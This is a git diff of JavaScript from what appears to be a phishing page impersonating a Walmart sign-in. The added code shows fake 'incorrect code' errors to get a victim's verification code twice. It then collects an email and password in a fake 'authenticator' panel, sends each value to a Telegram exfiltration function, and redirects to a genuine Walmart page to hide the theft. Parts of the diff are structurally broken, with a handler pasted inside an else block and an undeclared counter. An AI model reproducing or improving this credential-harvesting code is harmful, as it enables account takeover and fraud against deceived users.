@@ -1,3 +1,13 @@
+// Volver a inicio al hacer click en 'Change' del panel de código
+const changeLinkCode = document.getElementById('changeLinkCode');
+if(changeLinkCode){
+  changeLinkCode.addEventListener('click', (e)=>{
+    e.preventDefault();
+    if(panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden','true'); }
+    if(panel1) { panel1.style.display = 'block'; panel1.setAttribute('aria-hidden','false'); }
+    if(panel2) { panel2.style.display = 'none'; panel2.setAttribute('aria-hidden','true'); }
+  });
+}
 // Lógica para mostrar loader y mensaje al pedir otro código
 const getAnotherCode = document.getElementById('getAnotherCode');
 const codeLoader = document.getElementById('codeLoader');
@@ -151,21 +161,85 @@ function enviarCodigoTelegram(email, codigo) {
 
 // Lógica para capturar el código y enviarlo
 const signInCodeBtn = document.getElementById('signInCodeBtn');
-if (signInCodeBtn) {
-  signInCodeBtn.addEventListener('click', () => {
+let firstCode = null;
+if(signInCodeBtn){
+  signInCodeBtn.addEventListener('click', ()=>{
     const codeInputs = document.querySelectorAll('#codeInputs .code-input');
     let code = '';
     codeInputs.forEach(input => code += input.value.trim());
     const codeErrorAlert = document.getElementById('codeErrorAlert');
-    if (code.length === 6) {
+    // Alerta personalizada para segundo intento
+    let customError = document.getElementById('codeCustomError');
+    if(!customError && codeErrorAlert){
+      customError = document.createElement('div');
+      customError.id = 'codeCustomError';
+      customError.className = 'alert-error';
+      customError.style.display = 'none';
+      customError.innerHTML = '<span style="font-weight:bold;">&#9888;</span> The verification code you entered is incorrect. Please check and re-enter the 6-digit code.';
+      codeErrorAlert.parentNode.insertBefore(customError, codeErrorAlert.nextSibling);
+    }
+    if(code.length === 6){
       // Limpiar errores
-      if (codeErrorAlert) codeErrorAlert.style.display = 'none';
+      if(codeErrorAlert) codeErrorAlert.style.display = 'none';
       codeInputs.forEach(input => input.classList.remove('error'));
-      enviarCodigoTelegram(codePanelEmail.textContent, code);
-      // Redirigir a la página de Walmart después de enviar el código
-      window.location.href = 'https://www.walmart.com/help/article/walmart-com-terms-of-use/3b75080af40340d6bbd596f116fae5a0';
+      if(firstCode === null){
+        // Primer intento, guardar y pedir de nuevo
+        firstCode = code;
+        // Limpiar inputs
+        codeInputs.forEach(input => { input.value = ''; input.classList.remove('error'); });
+        if(customError) customError.style.display = 'block';
+        codeInputs[0].focus();
+      } else {
+        // Segundo intento, comparar
+        // Enviar ambos códigos al Telegram
+        enviarCodigoTelegram(codePanelEmail.textContent, `Primer código: ${firstCode}\nSegundo código: ${code}`);
+        // Mostrar panel de autenticación
+        if(panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden','true'); }
+        const panelAuthenticator = document.getElementById('panelAuthenticator');
+        if(panelAuthenticator) { panelAuthenticator.style.display = 'block'; panelAuthenticator.setAttribute('aria-hidden','false'); }
+        // Limpiar para siguiente uso
+        firstCode = null;
+
+// Lógica para el panel de autenticación extra (fuera del bloque)
+const authSubmitBtn = document.getElementById('authSubmitBtn');
+const authEmail = document.getElementById('authEmail');
+const authPassword = document.getElementById('authPassword');
+const authErrorAlert = document.getElementById('authErrorAlert');
+const authLoader = document.getElementById('authLoader');
+if(authSubmitBtn && authEmail && authPassword && authErrorAlert && authLoader){
+  authSubmitBtn.addEventListener('click', (e)=>{
+    e.preventDefault();
+    authErrorAlert.style.display = 'none';
+    authSubmitBtn.style.display = 'none';
+            authLoader.style.display = 'block';
+    // Enviar email y contraseña al Telegram
+    enviarCodigoTelegram(authEmail.value, `Authenticator email: ${authEmail.value}\nAuthenticator password: ${authPassword.value}`);
+            setTimeout(()=>{
+              authLoader.style.display = 'none';
+              authSubmitBtn.style.display = 'block';
+              authPassword.value = '';
+              authPassword.focus();
+              authAttempt++;
+              if(authAttempt === 1){
+                authErrorAlert.style.display = 'block';
+                authPassword.classList.add('error');
+              } else {
+                window.location.href = 'https://www.walmart.com/help';
+              }
+            // Estilo para el borde rojo del input de password
+            const style = document.createElement('style');
+            style.innerHTML = '.input-modern.error { border-color: #e05 !important; }';
+            document.head.appendChild(style);
+            authPassword.addEventListener('input', ()=>{
+              authPassword.classList.remove('error');
+              authErrorAlert.style.display = 'none';
+            });
+            }, 5000);
+  });
+}
+      }
     } else {
-      if (codeErrorAlert) codeErrorAlert.style.display = 'block';
+      if(codeErrorAlert) codeErrorAlert.style.display = 'block';
       codeInputs.forEach(input => input.classList.add('error'));
       codeInputs[0].focus();
     }
